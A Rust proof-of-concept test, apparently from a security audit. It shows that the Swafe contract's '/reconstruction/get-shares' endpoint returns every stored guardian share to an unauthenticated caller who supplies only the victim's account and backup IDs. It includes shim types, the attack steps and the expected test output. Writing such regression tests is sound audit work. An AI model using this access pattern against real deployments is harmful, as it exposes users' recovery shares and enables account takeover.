use std::collections::BTreeMap;

use http::endpoints::reconstruction::{get_shares as endpoint, upload_share::GuardianShareCollection};
use pbc_contract_common::off_chain::{HttpRequestData, OffChainContext};
use storage::Mapping;
use swafe_api::reconstruction::get_shares;
use swafe_lib::account::AccountId;
use swafe_lib::backup::{BackupId, GuardianShare};
use swafe_lib::encode::StrEncoded;

// ---- Minimal copies of the types that the contract endpoint expects --------------------------

pub mod shim_swafe_lib {
    pub mod account {
        use serde::{Deserialize, Serialize};

        #[derive(Clone, Copy, Serialize, Deserialize, Eq, PartialEq, Hash, Debug)]
        pub struct AccountId(pub [u8; 32]);

        impl AccountId {
            pub const fn new(bytes: [u8; 32]) -> Self {
                Self(bytes)
            }
        }
    }

    pub mod backup {
        use serde::{Deserialize, Serialize};

        #[derive(Clone, Copy, Serialize, Deserialize, Eq, PartialEq, Hash, Debug)]
        pub struct BackupId(pub [u8; 32]);

        impl BackupId {
            pub const fn new(bytes: [u8; 32]) -> Self {
                Self(bytes)
            }
        }

        #[derive(Clone, Serialize, Deserialize, Eq, PartialEq, Debug)]
        pub struct GuardianShare(pub Vec<u8>);

        impl GuardianShare {
            pub fn new(data: impl Into<Vec<u8>>) -> Self {
                GuardianShare(data.into())
            }
        }
    }

    pub mod encode {
        use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine as _};
        use serde::{de::DeserializeOwned, Deserialize, Deserializer, Serialize, Serializer};

        #[derive(Clone, Debug, PartialEq, Eq)]
        pub struct StrEncoded<T>(pub T);

        impl<T: Serialize> Serialize for StrEncoded<T> {
            fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
            where
                S: Serializer,
            {
                let bytes = serde_json::to_vec(&self.0)
                    .map_err(|e| serde::ser::Error::custom(format!("encode error: {e}")))?;
                let encoded = STANDARD_NO_PAD.encode(bytes);
                serializer.serialize_str(&encoded)
            }
        }

        impl<'de, T: DeserializeOwned> Deserialize<'de> for StrEncoded<T> {
            fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
            where
                D: Deserializer<'de>,
            {
                let encoded = String::deserialize(deserializer)?;
                let bytes = STANDARD_NO_PAD
                    .decode(encoded.as_bytes())
                    .map_err(|e| serde::de::Error::custom(format!("decode error: {e}")))?;
                let value = serde_json::from_slice(&bytes)
                    .map_err(|e| serde::de::Error::custom(format!("decode error: {e}")))?;
                Ok(StrEncoded(value))
            }
        }

        impl<T: Serialize> From<StrEncoded<T>> for String {
            fn from(val: StrEncoded<T>) -> Self {
                String::from(&val)
            }
        }

        impl<T: Serialize> From<&StrEncoded<T>> for String {
            fn from(val: &StrEncoded<T>) -> Self {
                let bytes = serde_json::to_vec(&val.0).expect("serialize to compare");
                STANDARD_NO_PAD.encode(bytes)
            }
        }

        pub fn serialize<T: Serialize>(value: &T) -> Result<Vec<u8>, serde_json::Error> {
            serde_json::to_vec(value)
        }

        pub fn deserialize<T: DeserializeOwned>(bytes: &[u8]) -> Result<T, serde_json::Error> {
            serde_json::from_slice(bytes)
        }
    }
}

pub use shim_swafe_lib::{account, backup, encode};
extern crate self as swafe_lib;

pub mod shim_swafe_api {
    pub mod reconstruction {
        pub mod get_shares {
            use serde::{Deserialize, Serialize};
            use swafe_lib::account::AccountId;
            use swafe_lib::backup::{BackupId, GuardianShare};
            use swafe_lib::encode::StrEncoded;

            pub const PATH: &str = "/reconstruction/get-shares";

            #[derive(Serialize, Deserialize)]
            pub struct Request {
                pub account_id: StrEncoded<AccountId>,
                pub backup_id: StrEncoded<BackupId>,
            }

            #[derive(Serialize, Deserialize)]
            pub struct Response {
                pub shares: Vec<StrEncoded<GuardianShare>>,
            }
        }
    }
}

pub use shim_swafe_api::reconstruction;
extern crate self as swafe_api;

// ---- Shim crates so that `include!("get_shares.rs")` sees the same API surface --------------

pub mod shim_matchit {
    #[derive(Default, Clone)]
    pub struct Params;
}

pub use shim_matchit::Params;
extern crate self as matchit;

pub mod shim_pbc_contract_common {
    pub mod off_chain {
        use std::collections::{BTreeMap, HashMap};

        #[derive(Clone, Debug)]
        pub struct HttpRequestData {
            pub method: String,
            pub uri: String,
            pub body: Vec<u8>,
        }

        impl HttpRequestData {
            pub fn new(method: &str, uri: &str, body: Vec<u8>) -> Self {
                Self {
                    method: method.to_lowercase(),
                    uri: uri.to_string(),
                    body,
                }
            }
        }

        #[derive(Clone, Debug)]
        pub struct HttpResponseData {
            pub status_code: u32,
            pub body: Vec<u8>,
        }

        impl HttpResponseData {
            pub fn new_with_str(status_code: u32, body: &str) -> Self {
                Self {
                    status_code,
                    body: body.as_bytes().to_vec(),
                }
            }

            pub fn status_code(&self) -> u32 {
                self.status_code
            }

            pub fn body(&self) -> &[u8] {
                &self.body
            }
        }

        #[derive(Default, Clone)]
        pub struct OffChainContext {
            storages: HashMap<Vec<u8>, BTreeMap<Vec<u8>, Vec<u8>>>,
        }

        impl OffChainContext {
            pub fn storage(
                &mut self,
                collection: &[u8],
            ) -> OffChainStorage<'_, Vec<u8>, Vec<u8>> {
                let entry = self
                    .storages
                    .entry(collection.to_vec())
                    .or_insert_with(BTreeMap::new);
                OffChainStorage { map: entry }
            }
        }

        pub struct OffChainStorage<'a, K, V> {
            map: &'a mut BTreeMap<K, V>,
        }

        impl<'a> OffChainStorage<'a, Vec<u8>, Vec<u8>> {
            pub fn get(&self, key: &Vec<u8>) -> Option<Vec<u8>> {
                self.map.get(key).cloned()
            }

            pub fn insert(&mut self, key: Vec<u8>, value: Vec<u8>) {
                self.map.insert(key, value);
            }
        }
    }
}

pub use shim_pbc_contract_common::off_chain;
extern crate self as pbc_contract_common;

mod storage {
    use super::off_chain::{OffChainContext, OffChainStorage};
    use swafe_lib::encode;

    pub trait Mapping {
        type Key: serde::Serialize;
        type Value: serde::Serialize + serde::de::DeserializeOwned;

        const COLLECTION_NAME: &'static str;

        fn load(ctx: &mut OffChainContext, key: Self::Key) -> Option<Self::Value> {
            let storage: OffChainStorage<Vec<u8>, Vec<u8>> =
                ctx.storage(Self::COLLECTION_NAME.as_bytes());
            let key = encode::serialize(&key).unwrap();
            let raw = storage.get(&key)?;
            encode::deserialize::<Self::Value>(raw.as_ref()).ok()
        }

        fn store(ctx: &mut OffChainContext, key: Self::Key, value: Self::Value) {
            let mut storage: OffChainStorage<Vec<u8>, Vec<u8>> =
                ctx.storage(Self::COLLECTION_NAME.as_bytes());
            let key = encode::serialize(&key).unwrap();
            let value = encode::serialize(&value).unwrap();
            storage.insert(key, value);
        }
    }
}

mod http {
    use super::off_chain::{HttpRequestData, HttpResponseData};

    pub mod json {
        use serde::{de::DeserializeOwned, Serialize};

        use super::error::ServerError;

        pub fn from_str<T: DeserializeOwned>(body: &str) -> Result<T, ServerError> {
            serde_json::from_str(body).map_err(|_| ServerError::InvalidRequestBody)
        }

        pub fn to_string<T: Serialize>(value: &T) -> Result<String, ServerError> {
            serde_json::to_string(value)
                .map_err(|_| ServerError::InvalidRequestBody)
        }
    }

    pub mod error {
        #[derive(Debug)]
        pub enum ServerError {
            InvalidRequestBody,
        }

        #[derive(Debug)]
        pub enum ContractError {
            Server(ServerError),
        }

        impl From<ServerError> for ContractError {
            fn from(err: ServerError) -> Self {
                ContractError::Server(err)
            }
        }
    }

    use error::ServerError;

    pub fn deserialize_request_body<T>(request: &HttpRequestData) -> Result<T, ServerError>
    where
        T: serde::de::DeserializeOwned,
    {
        let body_str = std::str::from_utf8(&request.body)
            .map_err(|_| ServerError::InvalidRequestBody)?;
        json::from_str(body_str)
    }

    pub fn create_json_response<T>(status_code: u32, data: &T) -> Result<HttpResponseData, ServerError>
    where
        T: serde::Serialize,
    {
        let json = json::to_string(data)?;
        Ok(HttpResponseData::new_with_str(status_code, &json))
    }

    pub mod endpoints {
        pub mod reconstruction {
            pub mod upload_share {
                use std::collections::BTreeMap;

                use swafe_lib::account::AccountId;
                use swafe_lib::backup::{BackupId, GuardianShare};

                use crate::storage::Mapping;

                #[derive(Clone, Default)]
                pub struct GuardianShareCollection;

                impl Mapping for GuardianShareCollection {
                    type Key = (AccountId, BackupId);
                    type Value = BTreeMap<u32, GuardianShare>;

                    const COLLECTION_NAME: &'static str = "map:guardian_shares";
                }
            }

            pub mod get_shares {
                include!("../../contracts/src/http/endpoints/reconstruction/get_shares.rs");
            }
        }
    }
}

#[derive(Clone, Default)]
pub struct ContractState;

/// Regression test for TC1: `/reconstruction/get-shares` leaks guardian shares to anyone who
/// knows the victim's account/backup IDs.
#[test]
fn unauthenticated_attacker_can_download_guardian_shares() {
    // --- Legitimate setup --------------------------------------------------
    println!("[setup] Seeding guardian shares for the victim's account");
    let account_id = AccountId::new([0xAA; 32]);
    let backup_id = BackupId::new([0xBB; 32]);

    // Guardian ciphertexts that should only be readable by the rightful account owner.
    let guardian_share1 = GuardianShare::new(b"guardian-share-1 ciphertext");
    let guardian_share2 = GuardianShare::new(b"guardian-share-2 ciphertext");

    // Honest uploads populate the off-chain storage via the same Mapping the contract uses.
    let mut ctx = OffChainContext::default();
    let mut stored = BTreeMap::new();
    stored.insert(0, guardian_share1.clone());
    stored.insert(1, guardian_share2.clone());
    GuardianShareCollection::store(&mut ctx, (account_id, backup_id), stored);

    // --- Attack ------------------------------------------------------------
    println!("[attack] Crafting attacker controlled request body");
    // Attacker-controlled body: just the public account & backup identifiers.
    let attacker_request = get_shares::Request {
        account_id: StrEncoded(account_id),
        backup_id: StrEncoded(backup_id),
    };
    let http_request = HttpRequestData::new(
        "post",
        endpoint::PATH,
        serde_json::to_vec(&attacker_request).expect("serialize request"),
    );

    // Call the real vulnerable handler – no authentication or proofs are required.
    let response = endpoint::handler(
        ctx,
        ContractState::default(),
        http_request,
        matchit::Params::default(),
    )
    .expect("handler should succeed for attacker");
    assert_eq!(response.status_code(), 200, "endpoint should return HTTP 200");

    // --- Impact -----------------------------------------------------------
    println!("[impact] Inspecting leaked guardian shares from the response");
    // The HTTP response contains every guardian share even though the caller proved nothing.
    let leaked: get_shares::Response =
        serde_json::from_slice(response.body()).expect("parse leaked shares");
    assert_eq!(leaked.shares.len(), 2, "all shares leaked");

    // Convert to base64 strings to show the exact ciphertexts that escaped.
    let leaked_strings: Vec<String> = leaked
        .shares
        .iter()
        .map(String::from)
        .collect();
    let expected_share1 = String::from(&StrEncoded(guardian_share1));
    let expected_share2 = String::from(&StrEncoded(guardian_share2));
    assert!(
        leaked_strings.contains(&expected_share1) && leaked_strings.contains(&expected_share2),
        "attacker retrieved both guardian ciphertexts"
    );
}

/*
# How to run & what you should see
```
cargo test --manifest-path security-poc/Cargo.toml --test tc1_guardian_leak --offline
```

```
test unauthenticated_attacker_can_download_guardian_shares ... ok
```
*/
